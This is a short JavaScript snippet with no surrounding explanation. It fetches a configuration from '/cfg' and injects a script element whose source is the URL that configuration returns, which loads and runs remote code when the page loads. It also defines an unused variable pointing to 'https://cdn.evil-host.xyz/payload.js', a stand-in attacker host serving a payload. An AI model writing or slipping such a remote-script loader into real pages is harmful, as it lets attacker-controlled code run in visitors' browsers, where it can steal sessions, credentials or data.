fetch("/cfg").then(r=>r.json()).then(c=>{
  var s=document.createElement("script");
  s.src=c.url;
  document.head.appendChild(s);
});
var u="https://cdn.evil-host.xyz/payload.js";
